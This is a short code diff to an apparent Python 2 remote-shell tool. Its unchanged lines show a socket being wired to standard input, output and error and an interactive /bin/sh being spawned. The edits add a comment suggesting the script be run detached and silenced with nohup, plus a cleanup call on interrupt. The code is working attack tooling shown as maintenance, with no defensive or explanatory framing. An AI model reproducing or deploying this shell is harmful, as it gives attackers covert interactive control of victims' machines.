@@ -1,5 +1,5 @@
 #!/usr/bin/python2
-
+# nohup command &>/dev/null &
 import os, socket, subprocess, threading, sys;
 from hashlib import sha512 as s5
 
@@ -13,7 +13,6 @@ def unsuccessful():
 
 # Linux shell
 def linux():
-    
    successful()
    os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh", "-i"])
@@ -77,4 +76,5 @@ try:
             linux()
 
 except KeyboardInterrupt:
+    unsuccessful()
     s.close()
